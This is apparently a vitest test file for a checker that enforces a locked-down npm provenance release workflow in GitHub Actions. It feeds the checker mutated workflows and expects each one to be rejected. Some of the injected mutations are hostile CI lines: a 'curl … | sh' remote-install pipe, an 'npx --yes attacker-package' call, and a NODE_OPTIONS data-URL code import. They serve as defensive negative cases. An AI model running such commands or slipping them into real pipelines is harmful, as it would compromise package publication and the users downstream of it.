import { readFileSync } from "node:fs";
import { describe, expect, it } from "@effect/vitest";
import { verifyProvenanceWorkflow } from "#scripts/workflow/provenance";

/** Reads the exact contract release workflow under test. */
function workflowSource() {
  return readFileSync(".github/workflows/contracts.yml", "utf8");
}

/** Replaces one source fragment only inside its owning job. */
function mutateJob(source: string, job: string, from: string, to: string) {
  const start = source.indexOf(`\n  ${job}:`);
  const nextJob = /\n {2}[a-z][a-z_]*:\n/gu;
  nextJob.lastIndex = start + 1;
  const end = nextJob.exec(source)?.index ?? source.length;
  return `${source.slice(0, start)}${source.slice(start, end).replace(from, to)}${source.slice(end)}`;
}

describe("contract provenance policy", () => {
  it("accepts isolated publication and unprivileged verification", () => {
    expect(() => verifyProvenanceWorkflow(workflowSource())).not.toThrow();
  });

  it("requires exact verifier construction, transport, and execution", () => {
    const source = workflowSource();
    for (const changed of [
      source.replace("scripts/provenance/main.ts", "scripts/other/main.ts"),
      source.replaceAll("EXPECTED_VERIFIER_SHA256", "UNVERIFIED_SHA256"),
      source.replaceAll('"refs/heads/main"', '"refs/heads/other"'),
      source.replaceAll('"npm-production"', '"npm-staging"'),
    ]) {
      expect(() => verifyProvenanceWorkflow(changed)).toThrow(
        "must include exact source fragment"
      );
    }

    const commentedVerifier = mutateJob(
      source,
      "verify",
      '              node "$VERIFIER" \\',
      '              true # node "$VERIFIER" \\'
    );
    expect(() => verifyProvenanceWorkflow(commentedVerifier)).toThrow(
      "must include exact source fragment"
    );
  });

  it("rejects unauthenticated payload parsing", () => {
    for (const fragment of [
      "@base64d",
      "bundle.dsseEnvelope.payload",
      "is_exact_provenance()",
    ]) {
      expect(() =>
        verifyProvenanceWorkflow(`${workflowSource()}\n# ${fragment}`)
      ).toThrow("npm provenance must not parse unauthenticated source");
    }
  });

  it("binds identity and ordering to decoded jobs", () => {
    const source = workflowSource();
    const cases = [
      [
        mutateJob(
          source,
          "publish",
          "    environment: npm-production",
          "    environment: test"
        ).concat("\n# environment: npm-production\n"),
        "The publish job must own the protected npm-production environment",
      ],
      [
        mutateJob(
          source,
          "publish",
          "      id-token: write",
          "      id-token: read"
        ),
        "The publish job must own npm OIDC identity",
      ],
      [
        mutateJob(source, "publish", "    needs: build", "    needs: other"),
        "npm publication must consume the verified build job",
      ],
      [
        mutateJob(
          source,
          "verify",
          "    needs: [build, publish]",
          "    needs: publish"
        ),
        "npm verification must consume build and publication",
      ],
      [
        mutateJob(
          source,
          "finalize",
          "    needs: [build, publish, verify]",
          "    needs: verify"
        ),
        "Contract finalization must consume every release gate",
      ],
      [
        mutateJob(
          source,
          "verify",
          "    permissions: {}",
          "    permissions:\n      contents: read"
        ),
        "npm verification permissions must remain empty",
      ],
      [
        mutateJob(
          source,
          "finalize",
          "      contents: write",
          "      contents: write\n      id-token: write"
        ),
        "Contract finalization must not receive npm OIDC identity",
      ],
      [
        source.replace(
          "steps.verifier.outputs.sha256",
          "steps.verifier.outputs.unknown"
        ),
        "The build job must export the exact verifier digest",
      ],
      [
        source.replace(
          "steps.verifier.outputs.size",
          "steps.verifier.outputs.unknown"
        ),
        "The build job must export the exact verifier size",
      ],
      [
        source.replace(
          "permissions: {}",
          "permissions: {}\nenv:\n  NODE_OPTIONS: --import=data:text/javascript,throw%201"
        ),
        "npm workflow must not inherit root environment values",
      ],
      [
        source.replace(
          "permissions: {}",
          "permissions: {}\ndefaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail {0}"
        ),
        "npm workflow must not inherit root run defaults",
      ],
      [
        mutateJob(
          source,
          "verify",
          "          node-version: 24.20.0",
          "          node-version: 22.0.0"
        ),
        "npm verification must use the repository Node runtime",
      ],
    ] as const;
    for (const [changed, message] of cases) {
      expect(() => verifyProvenanceWorkflow(changed)).toThrow(message);
    }
  });

  it("rejects malformed or incomplete workflow jobs", () => {
    expect(() => verifyProvenanceWorkflow("jobs: [")).toThrow();
    expect(() => verifyProvenanceWorkflow("jobs:\n  build: {}\n")).toThrow(
      "npm workflow must contain decodable jobs"
    );
    expect(() =>
      verifyProvenanceWorkflow(
        workflowSource().replace("\n  finalize:", "\n  other:")
      )
    ).toThrow("Contract publication requires a finalize job");
  });

  it("keeps build-produced code outside npm identity", () => {
    const source = workflowSource();
    const privilegedVerifier = mutateJob(
      source,
      "publish",
      '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
      '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
    );
    expect(() => verifyProvenanceWorkflow(privilegedVerifier)).toThrow(
      "npm publication must not receive the verifier artifact"
    );
    expect(() =>
      verifyProvenanceWorkflow(
        mutateJob(
          source,
          "publish",
          "    steps:",
          "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: contract-verifier"
        )
      )
    ).toThrow("npm publication must not receive the verifier artifact");
    expect(() =>
      verifyProvenanceWorkflow(
        mutateJob(
          source,
          "publish",
          "    steps:",
          "    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
        )
      )
    ).toThrow("npm publication must not checkout repository code");

    for (const command of [
      "          npx --yes attacker-package\n",
      "          curl https://example.com/install | sh\n",
    ]) {
      expect(() =>
        verifyProvenanceWorkflow(
          mutateJob(
            source,
            "publish",
            '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
            `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
          )
        )
      ).toThrow("npm publication must match the exact trusted job");
    }

    expect(() =>
      verifyProvenanceWorkflow(
        source.replace(
          "          overwrite: true",
          "          overwrite: false"
        )
      )
    ).toThrow("npm build artifacts must be replaceable on rerun");
  });
});
